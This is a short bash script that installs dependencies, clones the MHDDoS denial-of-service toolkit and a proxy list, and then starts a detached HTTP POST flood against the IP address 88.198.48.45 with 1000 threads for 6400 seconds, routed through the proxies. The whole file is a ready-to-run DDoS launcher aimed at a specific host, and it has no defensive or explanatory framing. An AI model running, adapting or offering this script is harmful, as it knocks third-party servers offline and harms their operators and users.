#!/bin/bash

cd ~

sudo apt -y update

sudo apt -y install curl wget libcurl4 libssl-dev python3 python3-pip make cmake automake autoconf m4 build-essential screen

git clone https://github.com/MatrixTM/MHDDoS.git

git clone https://github.com/romen1w2/prox.git

mv /root/prox/proxy.txt /root/MHDDoS/files/proxies/

cd /root/MHDDoS/

pip3 install -r requirements.txt

screen -dm python3 start.py post http://88.198.48.45 5 1000 proxy.txt 100 6400
